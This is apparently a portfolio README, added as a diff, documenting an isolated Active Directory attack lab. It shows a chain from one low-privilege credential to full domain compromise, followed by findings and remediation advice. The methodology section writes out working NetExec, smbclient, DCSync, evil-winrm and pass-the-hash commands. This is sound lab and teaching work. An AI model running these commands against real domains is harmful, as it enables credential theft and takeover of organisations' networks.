@@ -1,0 +1,168 @@
+# ArsenalDomain.com — Active Directory Attack Lab
+
+> A self-built, fully isolated Active Directory lab demonstrating a complete attack chain from an unauthenticated network foothold to full domain compromise — and, more importantly, the remediation guidance that would have stopped it.
+
+![Platform](https://img.shields.io/badge/Platform-VirtualBox-blue) ![OS](https://img.shields.io/badge/Targets-Windows%20Server%202022-lightgrey) ![Attacker](https://img.shields.io/badge/Attacker-Kali%20Linux-red) ![Domain](https://img.shields.io/badge/Result-Domain%20Admin-success)
+
+---
+
+## Overview
+
+This project documents an end-to-end internal Active Directory penetration test against a lab domain (`ArsenalDomain.com`) that I designed, built, and then compromised. The lab was deliberately seeded with realistic misconfigurations — including decoy "loot" files — to practise distinguishing genuine attack paths from red herrings.
+
+**Objective:** Starting from a single low-privilege domain user credential, escalate to Domain Admin and capture a designated high-value account (`a-mkitavi`).
+
+**Outcome:** Full domain compromise. Extracted all 38 credential hashes via DCSync, obtained an interactive shell on the Domain Controller, and demonstrated pass-the-hash against the target account.
+
+---
+
+## Lab Environment
+
+| Host | IP | Role | OS |
+|------|-----|------|-----|
+| DC-01 (`DOMAINCONTROLLER`) | 192.168.10.10 | Domain Controller, DNS | Windows Server 2022 |
+| WS-01 | 192.168.10.20 | Domain-joined workstation | Windows Server 2022 |
+| WS-02 | 192.168.10.21 | Domain-joined workstation (clone) | Windows Server 2022 |
+| FS-01 | 192.168.10.30 | File server | Windows Server 2022 |
+| Kali | 192.168.10.50 | Attacker | Kali Linux 2026.1 |
+
+- **Isolation:** VirtualBox NAT Network, statically addressed `192.168.10.0/24`. No DHCP server (every host static), all members using the DC as DNS. Fully sandboxed from the host LAN.
+- **Domain:** `ArsenalDomain.com`, 30 standard users plus service/admin accounts and standard groups.
+- **Seeded weaknesses:** shared default password across accounts, privileged accounts reusing that password, decoy credential files on an over-permissioned file share.
+
+---
+
+## Methodology
+
+The engagement followed a standard internal-assessment kill chain: **Recon → Enumeration → Credential Discovery → Privilege Escalation → Domain Compromise.**
+
+### 1. Reconnaissance
+
+Confirmed network reachability and mapped live hosts.
+
+```bash
+sudo nmap -sn 192.168.10.0/24
+sudo nmap -Pn -sV -p 88,135,139,389,445,464,636,3268,5985 192.168.10.10 192.168.10.30
+```
+
+The DC was fingerprinted by its service profile — Kerberos (88), LDAP/Global Catalog (389/636/3268), and kpasswd (464) — a combination unique to a Domain Controller. The LDAP banner leaked the domain name and DC hostname before any authentication. WinRM (5985) was noted as a future remote-execution channel.
+
+> **Note:** `-Pn` was essential — Windows Firewall dropped ICMP on the member servers while still answering on SMB/LDAP, so a ping-only sweep would have under-reported live hosts.
+
+### 2. Enumeration
+
+Using a single low-privilege domain credential (`jclark`), enumerated the domain over SMB and LDAP with NetExec.
+
+```bash
+nxc smb 192.168.10.30 -u jclark -p 'Password123!' --shares
+nxc smb 192.168.10.10 -u jclark -p 'Password123!' --users
+nxc ldap 192.168.10.10 -u jclark -p 'Password123!' --groups 'Domain Admins'
+```
+
+Key results:
+- **34 domain accounts** enumerated, including the built-ins and a separately-created admin-tier account, `a-mkitavi`.
+- The file server exposed `IT`, `Finance`, and `Public` shares as **READ/WRITE** to a standard user — excessive permissions.
+- **Domain Admins** membership: `Administrator`, `a-mkitavi`, **`janderson`**, **`mthompson`**.
+
+That last finding was the turning point: two of the *bulk-provisioned* users were sitting in Domain Admins.
+
+### 3. Credential Discovery — and Two Decoys
+
+Looted the over-shared `IT` directory:
+
+```bash
+smbclient '//192.168.10.30/IT' -U 'ArsenalDomain.com\jclark%Password123!' \
+  -c 'get passwords.txt; get backup.ps1'
+```
+
+Both files were **dead ends** — and recognising that quickly was the point:
+- `backup.ps1` referenced a service account (`svc_backup`) that **did not exist** in the directory (confirmed via LDAP `samAccountName` queries).
+- `passwords.txt` advertised a local-admin password that **failed** against the workstations (built-in local admin disabled / credential invalid).
+
+The "obvious" loot led nowhere. The real path came from enumeration, not from the planted bait.
+
+### 4. Privilege Escalation — Credential Reuse
+
+The two bulk-created Domain Admins were tested against the domain default password:
+
+```bash
+nxc smb 192.168.10.10 -u janderson -p 'Password123!'
+nxc smb 192.168.10.10 -u mthompson -p 'Password123!'
+```
+
+Both returned `(Pwn3d!)` against the Domain Controller — **password reuse on privileged accounts granted Domain Admin.**
+
+### 5. Domain Compromise
+
+With Domain Admin, performed a DCSync to extract the entire directory's credential material:
+
+```bash
+nxc smb 192.168.10.10 -u janderson -p 'Password123!' --ntds
+```
+
+This dumped **38 hashes**, including `krbtgt` (golden-ticket key), every user, and all machine accounts. A notable finding: the target account `a-mkitavi` shared an **identical NT hash with the built-in `Administrator`** — privileged accounts reusing the same password.
+
+Obtained an interactive Domain Admin shell on the DC:
+
+```bash
+evil-winrm -i 192.168.10.10 -u janderson -p 'Password123!'
+```
+
+And formally captured the objective account via **pass-the-hash** (no password required):
+
+```bash
+nxc smb 192.168.10.10 -u a-mkitavi -H <NT_hash>   # → (Pwn3d!)
+```
+
+**Objective complete:** Domain Controller owned, all credentials extracted, target account captured.
+
+---
+
+## Key Findings
+
+| # | Finding | Severity | Impact |
+|---|---------|----------|--------|
+| 1 | Privileged accounts (Domain Admins) reuse a weak, shared password | **Critical** | Direct path to full domain compromise |
+| 2 | Domain-wide password reuse (`Password123!`) | **Critical** | Single credential unlocks the environment |
+| 3 | Hardcoded credentials in a script on a readable share | **High** | Credential exposure (here, a decoy — but the pattern is real) |
+| 4 | Standard user has READ/WRITE to sensitive file shares | **High** | Data exposure; payload-staging foothold |
+| 5 | No tiered administration (DA accounts used like normal users) | **High** | Eliminates the blast-radius containment tiering provides |
+| 6 | Built-in local Administrator without unique per-host passwords | **Medium** | Lateral movement risk if a local password is reused |
+
+---
+
+## Remediation
+
+1. **Eliminate password reuse.** Enforce unique, strong passwords; deploy a password filter / banned-password list to kill `Password123!`-class credentials. This single control breaks the entire chain demonstrated here.
+2. **Implement administrative tiering.** Domain Admin accounts should never share credentials with standard accounts and should only authenticate to Tier 0 assets (DCs). Restrict DA interactive logon via Group Policy.
+3. **Deploy LAPS** (Windows LAPS) so every host has a unique, rotated local administrator password — removing lateral-movement-by-reuse.
+4. **Remove hardcoded secrets** from scripts; use a secrets manager or Group Managed Service Accounts (gMSA) for service credentials.
+5. **Apply least privilege to shares.** Standard users should not hold WRITE — or unnecessary READ — to IT/Finance content. Audit ACLs against role need.
+6. **Monitor for DCSync.** Alert on directory replication requests (e.g., `DRSUAPI` / Event ID 4662 with replication GUIDs) originating from non-DC hosts — a high-fidelity domain-compromise indicator.
+7. **Enforce account lockout and SMB signing**, and keep SMBv1 disabled (already in place in this build).
+
+---
+
+## Tools Used
+
+`Nmap` · `NetExec (nxc)` · `smbclient` · `Impacket (DCSync/secretsdump)` · `Evil-WinRM` · `Hashcat` · `VirtualBox`
+
+---
+
+## Skills Demonstrated
+
+- Active Directory enumeration (SMB/LDAP), user and group discovery
+- Attack-path analysis and the discipline to discard decoys/false leads
+- Credential-based privilege escalation and lateral movement
+- DCSync / NTDS extraction, pass-the-hash, and post-exploitation
+- Defensive translation: turning each finding into actionable remediation
+
+---
+
+## Key Takeaway
+
+The deliberately-planted "loot" — a credential file and a service-account script — led nowhere. Full domain compromise came instead from quiet enumeration and a single reused password on a privileged account. That mirrors real engagements far more than any capture-the-flag breadcrumb: **the loudest finding is rarely the one that owns the domain, and credential hygiene on privileged accounts is the control that matters most.**
+
+---
+
+*This lab was built and operated entirely within an isolated virtual network for educational and professional-development purposes. All credentials, hostnames, and data are fictional lab values.*
